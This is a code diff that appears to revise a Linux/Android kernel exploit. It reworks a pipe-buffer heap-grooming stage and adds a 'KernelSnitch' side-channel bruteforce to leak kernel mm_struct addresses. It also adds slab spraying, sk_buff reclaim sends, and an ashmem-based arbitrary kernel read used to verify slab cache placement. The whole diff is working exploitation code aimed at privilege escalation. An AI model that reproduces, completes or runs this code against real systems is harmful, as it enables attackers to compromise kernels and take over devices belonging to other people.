@@ -356,6 +356,7 @@ uintptr_t prepare_pipe_buffer_page_child(void) {
   struct mm_ctx post;
   size_t objs_per_slab = ORDER3_SIZE / MM_STRUCT_SZ;
 
+  pin_to_core(CORE);
   init_ctx(&prep, 32 * objs_per_slab);
   init_ctx(&spray, (1 + MM_PARTIALS) * objs_per_slab);
   init_ctx(&pre, objs_per_slab - 1);
@@ -401,6 +402,25 @@ uintptr_t prepare_pipe_buffer_page_child(void) {
   unsigned char *buf = malloc(SKB_SEND_SIZE);
   memset(buf, 0x50, SKB_SEND_SIZE);
 
+  run_kernelsnitch_bruteforce();
+  uintptr_t leaked = cleanup_kernelsnitch();
+  if (leaked == (uintptr_t)-1) {
+    pr_warning("pipe KernelSnitch sk_buff page leak failed\n");
+    pipe_child_release_ctx(&prep, &spray, &pre, &post, buf);
+    return 0;
+  }
+  uintptr_t base = leaked & ~(ORDER3_SIZE - 1);
+  pr_info("pipe mm leaked=%016zx base=%016zx object_index=%zu\n",
+          leaked, base, (leaked - base) / MM_STRUCT_SZ);
+#if defined(APP_REQUIRE_FRESH_P0_SESSION) && APP_REQUIRE_FRESH_P0_SESSION
+  if (getenv("KS_LEAK_ONLY")) {
+    pr_success("KernelSnitch leak-only mm=%016zx base=%016zx object_index=%zu\n",
+               leaked, base, (leaked - base) / MM_STRUCT_SZ);
+    fflush(NULL);
+    _exit(0);
+  }
+#endif
+
   int skb_sv[2];
   int pcp_sv[2];
   SYSCHK(socketpair(AF_UNIX, SOCK_STREAM, 0, skb_sv));
@@ -443,24 +463,28 @@ uintptr_t prepare_pipe_buffer_page_child(void) {
   sched_yield();
   sched_yield();
   SYSCHK(close(leak_memfd));
-  SYSCHK(sendmsg(skb_sv[0], &msg, 0));
+  for (size_t i = 0; i < prep.mm_cnt; i += objs_per_slab) {
+    if (prep.memfds[i] > 0) {
+      SYSCHK(close(prep.memfds[i]));
+      prep.memfds[i] = -1;
+    }
+  }
 
-  run_kernelsnitch_bruteforce();
-  uintptr_t leaked = cleanup_kernelsnitch();
-  if (leaked == (uintptr_t)-1) {
-    pr_warning("pipe KernelSnitch sk_buff page leak failed\n");
-    pipe_child_release_ctx(&prep, &spray, &pre, &post, buf);
-    return 0;
+  int sndbuf = 1 << 20;
+  setsockopt(skb_sv[0], SOL_SOCKET, SO_SNDBUF, &sndbuf, sizeof(sndbuf));
+  struct iovec slide_iov;
+  memset(&slide_iov, 0, sizeof(slide_iov));
+  slide_iov.iov_base = buf;
+  slide_iov.iov_len = SLIDE_SKB_SEND_SIZE;
+  struct msghdr slide_msg;
+  memset(&slide_msg, 0, sizeof(slide_msg));
+  slide_msg.msg_iov = &slide_iov;
+  slide_msg.msg_iovlen = 1;
+  for (int i = 0; i < SKB_RECLAIM_SENDS; i++) {
+    if (sendmsg(skb_sv[0], &slide_msg, MSG_DONTWAIT) <= 0) {
+      break;
+    }
   }
-  uintptr_t base = leaked & ~(ORDER3_SIZE - 1);
-#if defined(APP_REQUIRE_FRESH_P0_SESSION) && APP_REQUIRE_FRESH_P0_SESSION
-  if (getenv("KS_LEAK_ONLY")) {
-    pr_success("KernelSnitch leak-only mm=%016zx base=%016zx object_index=%zu\n",
-               leaked, base, (leaked - base) / MM_STRUCT_SZ);
-    fflush(NULL);
-    _exit(0);
-  }
-#endif
 
   /* [pipefix] budget plan (campaign 13/15/16 arithmetic): F_SETPIPE_SZ
    * growth is charged per-real-uid against fs.pipe-user-pages-soft, and
@@ -501,8 +525,26 @@ uintptr_t prepare_pipe_buffer_page_child(void) {
     }
   }
 
+  pipebuf_page_base = base;
+  int gfd = open_ashmem_device();
+  if (gfd < 0) {
+    pr_warning("pipe prepare cache gate alias unavailable errno=%d\n", errno);
+  } else if (pipe_reclaim_cache_gate(gfd)) {
+    pr_success("pipe prepare cache ok slab=%016zx page=%016zx\n",
+               candidate_slab_cache, pipebuf_page_base);
+    close(gfd);
+  } else {
+    pr_warning("pipe prepare cache rejected slab=%016zx want=%016zx hit=%d\n",
+               candidate_slab_cache, kmalloc_pipe_cache,
+               pipe_cache_slot_hit);
+    close(gfd);
+    pipe_child_release_ctx(&prep, &spray, &pre, &post, buf);
+    return 0;
+  }
+
+  uintptr_t page = pipebuf_page_base;
   pipe_child_release_ctx(&prep, &spray, &pre, &post, buf);
-  return base;
+  return page;
 }
 
 /* ================= exit-path protection (fixwave 2026-10) =================
@@ -834,10 +876,14 @@ int pipe_reclaim_cache_gate(int fd) {
   kmalloc_pipe_cache =
     kernel_read64(fd, data_addr(KMALLOC_CGROUP_PIPE_SLOT));
   pr_info("pipe caches normal1k=%016zx normal2k=%016zx "
-          "cgroup1k=%016zx cgroup2k=%016zx selected=%016zx\n",
+          "cgroup1k=%016zx cgroup2k=%016zx selected=%016zx "
+          "rcl1k=%016zx rcl2k=%016zx rcl8k=%016zx\n",
           kmalloc_normal_1k_cache, kmalloc_normal_2k_cache,
           kmalloc_cgroup_1k_cache, kmalloc_cgroup_2k_cache,
-          kmalloc_pipe_cache);
+          kmalloc_pipe_cache,
+          cache_slots[2 * KMALLOC_BUCKETS + 10],
+          cache_slots[2 * KMALLOC_BUCKETS + 11],
+          cache_slots[2 * KMALLOC_BUCKETS + 13]);
   for (size_t off = 0; off < ORDER3_SIZE; off += PAGE_SIZE) {
     uintptr_t page = pipebuf_page_base + off;
     uintptr_t head = direct_to_head_page(fd, page);
@@ -845,27 +891,33 @@ int pipe_reclaim_cache_gate(int fd) {
     uint64_t cache10 = kernel_read64(fd, head + 0x10);
     uint64_t cache18 = kernel_read64(fd, head + 0x18);
     uint64_t cache20 = kernel_read64(fd, head + 0x20);
+    uint64_t cache28 = kernel_read64(fd, head + 0x28);
     uint64_t slab_cache = kernel_read64(fd, head + STRUCT_SLAB_CACHE_OFF);
     uintptr_t type_addr = head + STRUCT_PAGE_TYPE_OFF;
     uint32_t page_type = (uint32_t)kernel_read64(fd, type_addr);
     pipe_page_slab_cache[off / PAGE_SIZE] = slab_cache;
     pipe_page_type[off / PAGE_SIZE] = page_type;
     int cache_match = pipe_cache_matches(slab_cache);
-    pr_info("pipe page idx=%zu page=%016zx head=%016zx "
-            "cache08=%016llx cache10=%016llx cache18=%016llx "
-            "cache20=%016llx type=%08x match=%d\n",
-            off / PAGE_SIZE, page, head,
-            (unsigned long long)cache08,
-            (unsigned long long)cache10,
-            (unsigned long long)cache18,
-            (unsigned long long)cache20, page_type, cache_match);
-    if (off == 0 || cache_match) {
-      candidate_slab_cache = slab_cache;
-    }
     for (int slot = 0; slot < KMALLOC_CACHE_SLOTS; slot++) {
       if (cache_slots[slot] == slab_cache) {
         pipe_cache_slot_hit = slot;
       }
+    }
+    pr_info("pipe page idx=%zu page=%016zx head=%016zx "
+            "cache08=%016llx cache10=%016llx cache18=%016llx "
+            "cache20=%016llx type=%08x match=%d hit=%d cache28=%016llx "
+            "inuse=%u obj=%u frozen=%u\n",
+            off / PAGE_SIZE, page, head,
+            (unsigned long long)cache08,
+            (unsigned long long)cache10,
+            (unsigned long long)cache18,
+            (unsigned long long)cache20, page_type, cache_match,
+            pipe_cache_slot_hit, (unsigned long long)cache28,
+            (unsigned)(cache28 & 0xffff),
+            (unsigned)((cache28 >> 16) & 0x7fff),
+            (unsigned)(cache28 >> 31));
+    if (off == 0 || cache_match) {
+      candidate_slab_cache = slab_cache;
     }
     if (cache_match) {
       pipebuf_page_base = page;
